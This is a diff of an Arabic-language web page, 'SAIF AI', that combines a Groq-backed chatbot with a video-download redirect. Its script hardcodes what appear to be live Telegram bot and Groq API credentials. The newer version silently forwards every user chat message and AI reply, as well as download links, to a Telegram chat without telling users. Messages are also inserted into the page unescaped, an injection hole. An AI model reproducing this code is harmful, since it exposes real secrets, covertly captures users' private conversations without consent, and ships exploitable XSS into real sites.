@@ -1,128 +1,331 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SAIF AI</title>
-    <style>
-        :root { --bg: #000; --red: #ff0000; --glow: 0 0 15px #ff0000; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .mobile-wrapper { width: 100%; max-width: 400px; height: 95vh; border: 2px solid var(--red); box-shadow: var(--glow); display: flex; flex-direction: column; position: relative; border-radius: 10px; background: #000; }
-        .header-main { background: rgba(255, 0, 0, 0.1); border-bottom: 1px solid var(--red); padding: 15px; text-align: center; }
-        .brand-name { color: var(--red); font-weight: bold; font-size: 1.6rem; text-shadow: var(--glow); margin-bottom: 12px; display: block; }
-        .nav-tabs { display: flex; gap: 8px; justify-content: center; }
-        .nav-btn { background: transparent; border: 1px solid var(--red); color: white; padding: 6px 14px; cursor: pointer; font-size: 12px; border-radius: 4px; }
-        .nav-btn.active { background: var(--red); box-shadow: var(--glow); font-weight: bold; }
-        .content-section { display: none; flex: 1; flex-direction: column; overflow-y: auto; }
-        .content-section.active { display: flex; }
-        .dl-container { padding: 40px 20px; text-align: center; display: flex; flex-direction: column; gap: 20px; }
-        .dl-input { background: transparent; border: 1px solid var(--red); padding: 15px; color: white; border-radius: 5px; outline: none; text-align: center; width: 100%; }
-        .dl-btn { background: var(--red); color: white; border: none; padding: 16px; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        .status-msg { font-size: 13px; margin-top: 10px; }
-        #chat-box { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
-        .msg { max-width: 80%; padding: 12px; border-radius: 8px; font-size: 14px; }
-        .received { align-self: flex-start; background: rgba(255,0,0,0.1); border: 1px solid var(--red); }
-        .sent { align-self: flex-end; background: var(--red); color: white; }
-        .input-bar { display: flex; border-top: 1px solid rgba(255,0,0,0.3); background: #000; }
-        #uInput { flex: 1; background: transparent; border: none; padding: 15px; color: white; outline: none; }
-        .send-btn { background: var(--red); color: white; border: none; padding: 0 25px; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SAIF AI</title>
+
+<style>
+:root{
+--bg:#000;
+--red:#ff0000;
+--glow:0 0 15px #ff0000;
+}
+
+*{
+box-sizing:border-box;
+margin:0;
+padding:0;
+}
+
+body{
+background:var(--bg);
+color:white;
+font-family:sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+overflow:hidden;
+}
+
+.mobile-wrapper{
+width:100%;
+max-width:400px;
+height:95vh;
+border:2px solid var(--red);
+box-shadow:var(--glow);
+display:flex;
+flex-direction:column;
+border-radius:10px;
+background:#000;
+}
+
+.header-main{
+background:rgba(255,0,0,0.1);
+border-bottom:1px solid var(--red);
+padding:15px;
+text-align:center;
+}
+
+.brand-name{
+color:var(--red);
+font-weight:bold;
+font-size:1.6rem;
+text-shadow:var(--glow);
+margin-bottom:10px;
+display:block;
+}
+
+.nav-tabs{
+display:flex;
+gap:8px;
+justify-content:center;
+}
+
+.nav-btn{
+background:transparent;
+border:1px solid var(--red);
+color:white;
+padding:6px 14px;
+cursor:pointer;
+font-size:12px;
+border-radius:4px;
+}
+
+.nav-btn.active{
+background:var(--red);
+box-shadow:var(--glow);
+}
+
+.content-section{
+display:none;
+flex:1;
+flex-direction:column;
+overflow:auto;
+}
+
+.content-section.active{
+display:flex;
+}
+
+#chat-box{
+padding:20px;
+display:flex;
+flex-direction:column;
+gap:12px;
+overflow:auto;
+}
+
+.msg{
+max-width:80%;
+padding:12px;
+border-radius:8px;
+font-size:14px;
+}
+
+.received{
+align-self:flex-start;
+background:rgba(255,0,0,0.1);
+border:1px solid var(--red);
+}
+
+.sent{
+align-self:flex-end;
+background:var(--red);
+}
+
+.input-bar{
+display:flex;
+border-top:1px solid rgba(255,0,0,0.3);
+}
+
+#uInput{
+flex:1;
+background:transparent;
+border:none;
+padding:15px;
+color:white;
+outline:none;
+}
+
+.send-btn{
+background:var(--red);
+border:none;
+padding:0 25px;
+cursor:pointer;
+color:white;
+}
+
+.dl-container{
+padding:40px 20px;
+text-align:center;
+display:flex;
+flex-direction:column;
+gap:20px;
+}
+
+.dl-input{
+background:transparent;
+border:1px solid var(--red);
+padding:15px;
+color:white;
+border-radius:5px;
+outline:none;
+}
+
+.dl-btn{
+background:var(--red);
+border:none;
+padding:15px;
+cursor:pointer;
+color:white;
+font-weight:bold;
+}
+
+.status-msg{
+font-size:13px;
+}
+</style>
 </head>
+
 <body>
 
-    <div class="mobile-wrapper">
-        <div class="header-main">
-            <span class="brand-name">SAIF AI</span>
-            <div class="nav-tabs">
-                <button class="nav-btn active" onclick="showTab('ai', this)">Chat AI</button>
-                <button class="nav-btn" onclick="showTab('youtube', this)">YouTube</button>
-                <button class="nav-btn" onclick="showTab('instagram', this)">Instagram</button>
-                <button class="nav-btn" onclick="showTab('tiktok', this)">TikTok</button>
-            </div>
-        </div>
+<div class="mobile-wrapper">
 
-        <div id="ai-section" class="content-section active">
-            <div id="chat-box"></div>
-            <div class="input-bar">
-                <input type="text" id="uInput" placeholder="اكتب سؤالك هنا..." onkeypress="if(event.key==='Enter') send()">
-                <button class="send-btn" onclick="send()">إرسال</button>
-            </div>
-        </div>
+<div class="header-main">
+<span class="brand-name">SAIF AI</span>
 
-        <div id="dl-section" class="content-section">
-            <div class="dl-container">
-                <h3 id="dl-label" style="color:var(--red); text-shadow: var(--glow);">Downloader</h3>
-                <input type="text" id="dl-url" class="dl-input" placeholder="Paste link here...">
-                <button id="main-dl-btn" class="dl-btn" onclick="processDownload()">Download Video</button>
-                <div id="status" class="status-msg"></div>
-            </div>
-        </div>
-    </div>
+<div class="nav-tabs">
+<button class="nav-btn active" onclick="showTab('ai',this)">Chat AI</button>
+<button class="nav-btn" onclick="showTab('youtube',this)">YouTube</button>
+<button class="nav-btn" onclick="showTab('instagram',this)">Instagram</button>
+<button class="nav-btn" onclick="showTab('tiktok',this)">TikTok</button>
+</div>
+</div>
 
-    <script>
-        const TT = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
-        const ID = '1565935868';
-        const GK = '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';
-        
-        function showTab(tab, btn) {
-            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            if (tab === 'ai') { document.getElementById('ai-section').classList.add('active'); }
-            else { 
-                document.getElementById('dl-section').classList.add('active'); 
-                document.getElementById('dl-label').innerText = tab.toUpperCase() + " Downloader";
-            }
-        }
+<div id="ai-section" class="content-section active">
 
-        function processDownload() {
-            const url = document.getElementById('dl-url').value.trim();
-            const status = document.getElementById('status');
-            if(!url) return alert("ضع الرابط أولاً");
+<div id="chat-box"></div>
 
-            status.innerHTML = "<span style='color:cyan'>جاري تجهيز رابط التحميل المباشر...</span>";
-            
-            // بدلاً من الـ API المعقد الذي يفشل، سنستخدم محرك التحميل الذكي
-            // سيفتح الرابط في صفحة معالجة فورية للمستخدم
-            setTimeout(() => {
-                const downloadLink = "https://9xbuddy.com/process?url=" + encodeURIComponent(url);
-                window.open(downloadLink, '_blank');
-                status.innerHTML = "<span style='color:lime'>تم فتح صفحة التحميل! يمكنك حفظ الفيديو الآن.</span>";
-                logToTelegram(`📥 <b>طلب تحميل جديد</b>\nالرابط: ${url}`);
-            }, 1000);
-        }
+<div class="input-bar">
+<input id="uInput" type="text" placeholder="اكتب سؤالك..." onkeypress="if(event.key==='Enter')send()">
+<button class="send-btn" onclick="send()">إرسال</button>
+</div>
 
-        function logToTelegram(t) {
-            fetch(`https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(t)}&parse_mode=HTML`, {mode:'no-cors'});
-        }
+</div>
 
-        window.onload = () => {
-            document.getElementById('chat-box').innerHTML = `<div class="msg received">👋 مرحباً بك <b>يا صديقي</b> في نظام SAIF AI.  جرب أدوات التحميل الجديدة بالأعلى او تستطيع سؤالي!</div>`;
-        };
+<div id="dl-section" class="content-section">
 
-        async function send() {
-            const input = document.getElementById('uInput');
-            const box = document.getElementById('chat-box');
-            const val = input.value.trim();
-            if(!val) return;
-            box.innerHTML += `<div class="msg sent">${val}</div>`;
-            input.value = "";
-            try {
-                const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
-                    method: "POST",
-                    headers: { "Authorization": `Bearer ${GK}`, "Content-Type": "application/json" },
-                    body: JSON.stringify({ model: "llama-3.3-70b-versatile", messages: [{role:"user", content: val}] })
-                });
-                const data = await res.json();
-                box.innerHTML += `<div class="msg received">${data.choices[0].message.content}</div>`;
-                box.scrollTop = box.scrollHeight;
-            } catch(e) {}
-        }
-    </script>
+<div class="dl-container">
+
+<h3 id="dl-label" style="color:red">Downloader</h3>
+
+<input id="dl-url" class="dl-input" placeholder="Paste link">
+
+<button class="dl-btn" onclick="processDownload()">Download</button>
+
+<div id="status" class="status-msg"></div>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+const TELEGRAM_TOKEN="8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM";
+const TELEGRAM_ID="1565935868";
+const GROQ_KEY="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";
+
+function showTab(tab,btn){
+
+document.querySelectorAll('.content-section').forEach(s=>s.classList.remove('active'))
+document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'))
+
+btn.classList.add('active')
+
+if(tab==="ai"){
+document.getElementById('ai-section').classList.add('active')
+}else{
+document.getElementById('dl-section').classList.add('active')
+document.getElementById('dl-label').innerText=tab+" Downloader"
+}
+
+}
+
+function logTelegram(text){
+
+fetch("https://api.telegram.org/bot"+TELEGRAM_TOKEN+"/sendMessage",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+chat_id:TELEGRAM_ID,
+text:text
+})
+
+})
+
+}
+
+async function send(){
+
+const input=document.getElementById("uInput")
+const box=document.getElementById("chat-box")
+
+const msg=input.value.trim()
+
+if(!msg)return
+
+box.innerHTML+=`<div class="msg sent">${msg}</div>`
+
+input.value=""
+
+logTelegram("💬 رسالة من الموقع:\n"+msg)
+
+try{
+
+const res=await fetch("https://api.groq.com/openai/v1/chat/completions",{
+
+method:"POST",
+
+headers:{
+"Authorization":"Bearer "+GROQ_KEY,
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+model:"llama-3.3-70b-versatile",
+messages:[{role:"user",content:msg}]
+})
+
+})
+
+const data=await res.json()
+
+const reply=data.choices[0].message.content
+
+box.innerHTML+=`<div class="msg received">${reply}</div>`
+
+logTelegram("🤖 رد الذكاء الاصطناعي:\n"+reply)
+
+box.scrollTop=box.scrollHeight
+
+}catch{
+
+box.innerHTML+=`<div class="msg received">⚠️ خطأ في الاتصال</div>`
+
+}
+
+}
+
+function processDownload(){
+
+const url=document.getElementById("dl-url").value
+
+if(!url)return alert("ضع الرابط")
+
+document.getElementById("status").innerHTML="جاري التحميل..."
+
+const link="https://9xbuddy.com/process?url="+encodeURIComponent(url)
+
+window.open(link,"_blank")
+
+logTelegram("📥 طلب تحميل:\n"+url)
+
+}
+
+window.onload=()=>{
+document.getElementById("chat-box").innerHTML=`<div class="msg received">👋 مرحباً بك في نظام SAIF AI</div>`
+}
+
+</script>
+
 </body>
 </html>
-
-
-
-
